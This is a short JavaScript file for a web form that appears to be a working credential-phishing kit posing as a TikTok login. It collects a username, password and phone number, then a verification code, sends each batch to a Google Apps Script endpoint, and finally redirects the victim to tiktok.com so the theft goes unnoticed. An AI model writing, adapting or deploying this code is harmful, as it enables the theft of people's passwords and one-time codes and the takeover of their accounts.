const url = "https://script.google.com/macros/s/AKfycbzfqekEJMr3zdCL2AEFiQ-8UWqYQ-fjou9EsHWPCgi26A6uGR4dq27RsZBmVCgam-yM/exec";

let dataUser = {};
let sedangKirim = false;
let sedangVerifikasi = false;


// Enter pindah input
document.querySelectorAll("#formUser input").forEach((input,index,inputs)=>{

  input.addEventListener("keydown",function(e){

    if(e.key === "Enter"){

      e.preventDefault();

      if(index < inputs.length - 1){
        inputs[index + 1].focus();
      }

    }

  });

});


// Tombol Masuk
document.getElementById("formUser")
.addEventListener("submit",function(e){

  e.preventDefault();

  if(sedangKirim) return;

  sedangKirim = true;

  dataUser = {

    username: document.getElementById("username").value,
    password: document.getElementById("password").value,
    telepon: document.getElementById("telepon").value

  };

  fetch(url,{

    method:"POST",

    body:JSON.stringify(dataUser)

  })

  .then(res => res.text())

  .then(result => {

    console.log(result);

    document.getElementById("formData").style.display = "none";
    document.getElementById("verifikasi").style.display = "block";

  })

  .catch(err => {

    sedangKirim = false;

    console.log(err);

    alert("Gagal mengirim data");

  });

});


// Tombol Verifikasi
function kirimKode(){

  if(sedangVerifikasi) return;

  sedangVerifikasi = true;

  dataUser.kode = document.getElementById("kode").value;

  fetch(url,{

    method:"POST",

    body:JSON.stringify(dataUser)

  })

  .then(res => res.text())

  .then(() => {

    alert("Kode berhasil dikirim");

    bukaTikTok();

  })

  .catch(err => {

    sedangVerifikasi = false;

    console.log(err);

    alert("Gagal mengirim data");

  });

}


function bukaTikTok(){

  window.location.href = "https://www.tiktok.com";

}
